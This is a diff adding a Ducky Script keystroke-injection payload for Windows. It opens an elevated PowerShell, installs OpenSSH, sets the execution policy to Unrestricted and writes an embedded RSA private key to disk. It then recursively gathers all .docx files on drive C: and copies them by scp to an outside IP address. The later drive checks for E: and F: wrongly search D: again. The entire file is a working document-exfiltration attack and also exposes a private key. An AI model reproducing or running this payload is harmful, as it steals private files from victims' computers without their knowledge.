@@ -1,0 +1,100 @@
+DELAY 500
+WINDOWS r
+DELAY 1000
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+LEFTARROW
+ENTER
+DELAY 500
+STRING Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+ENTER
+DELAY 10000
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 500
+STRING Y
+ENTER
+DELAY 1000
+STRING ssh-keygen
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd ~/.ssh/
+ENTER
+STRING New-Item ~/.ssh/Key -ItemType File
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '-----BEGIN RSA PRIVATE KEY-----'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'MIIEowIBAAKCAQEAtCx7bAog2TYyVMci5RnD2NLE126sQs45DXo0aXJcnqsTwoty'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'SI4Z9tohJj6Abvk1jITG6z9gbfzGmNBjEnQP2CEvtgdTGqxuYcZvsRaC7Bd7V0TE'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '/dZ4XkuwRd6iFFc7JalHAEA3AGW8h/dth17x0gq7mFrTEJSiHa7EKD3SGHZREbme'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'yLvlqQV6pkw5G5y04zkhPsdi6dpVNRnPDDxmOLIr9Zvk86qKv+RPoUZ3NAnjYMQl'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '8ktlkFkcclNQIGGoFlok/jFnHFdrJE17RBEAgWAfTcLVY9E2Pg0fSBUUkyFz9uYJ'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'P0sZ+U69IeLtPRmROn2gB8t/KH1utSwkvjtWkQIDAQABAoIBAD+4g6YAJwHrIv3M'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 't9CivhsO38L5Rz8RRCg6EhNA+PS8uG5TdwWmDBS7rIGkFTQqOwAJbXiBn48GmQ4u'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'lPtPxNLBWehcys1iMl+uGI5e0crBu0Nv9ON5WHSw/BSZ2mSrPSXiqlOyYkFnube0'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'kC4SLCAG37XQWVlB19v7lTBOPOGdTcQG7Rmxku//aDtAyjgUI/bX1jzXbz3HC/ti'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'NYCyV/O9sgBxOne8ecS0dNvaOMqgPhY4Sea7XOdc5sFTXYj8NiOabd63oafV+jC2'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'f1ZcH5lXn3CW7V+HxwbtD+EjOci1+mKQrY18u+7rH6RoYUP4HmFpmG+vGL+cP6v9'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'V11C7AkCgYEA8LWWgvYEOqMGLyx1LFDLWG7N1s0j/pDKJqj0COTILyJujE8D1Aj/'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'kVpcC4eVeLtERYsSn5m/6ADkxwKkLmDkww9JpOXrIJrdhPkzJrP74zUKpJdoG9IR'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'dECFwloEJNosHjZQCyE/q/wBFaMFtzIguelJy8OcIa+pgzakunyJGysCgYEAv553'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'K6H1Iycxz9p+hPlQKCKOW45b14Ll+H0aKsN/sdydBjwbZxQqFcTkV3KdCiuIwD7n'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'T/ipI5/TQLaitTG9XNhnfws/OYAtSn4931gierNCaDiBDSFjFZ1vyL+knpCaSlNn'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '48MkOI7MRHi+tWMpabZUkW4jkHhDuZGD3aAmRzMCgYAVJB3ACtN8Qu08H297IO17'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'KuAxSXsr1JOsqZIlZdKfMSr8b8QqT1AC+Ci1aocaP3hTk09jbSGJwupVAEpjOGdf'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'KmyRaxAnoPJrx2dSsuQgpHv20MV4DA80YqZc14MdqXvOe360O4tYE54UxGiwGlr9'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'eRveJaQE4WTF/XqiVmXEWQKBgQCQ7ykwJYYnGqRAlQERTwnj8Y8/jQPGlEmhk+5Q'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '3iIdw8I5TwljBAt4/72+rwA9CwSadHm9MVWtjlvZHMsgxgh2y3As1bLyqRKYv7fI'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '0P7zU9cswWBLMC+jz7sXWm0HSlSJV2DDE3y4ErpKKBIHXIOcY76/aVEZGv4OxBO7'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'dEC/pQKBgCGD0SVeTX+6Lk9S/s7cNpUryItmFw2TeAlTZ1Sx0YtEHW6NuOeLZxnL'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value 'YlUlxXnGhU4Smpurp6jGnUtGBuk9kSgREIG094uYZ9UclVqnUUVrUwF56ekWfNw/'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '1ePYrh1EMGMTU862ryWm+1i21KBabJq7Wix5JwNcQWoLSYqoFQKC'
+ENTER
+STRING Add-Content -Path ~/.ssh/Key -Value '-----END RSA PRIVATE KEY-----'
+ENTER
+STRING scp -i ~\.ssh\Key $(Get-ChildItem -Path C:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download
+ENTER
+STRING yes
+ENTER
+DELAY 10000
+STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "D") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
+ENTER
+DELAY 10000
+STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "E") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
+ENTER
+DELAY 10000
+STRING if ((Get-PSDrive -PSProvider FileSystem | %{$_.Name}) -contains "F") {scp -i ~\.ssh\Key $(Get-ChildItem -Path D:\ -Filter *.docx -Recurse | %{$_.FullName}) ubuntu@16.170.236.72:/home/ubuntu/download}
+ENTER
+DELAY 10000
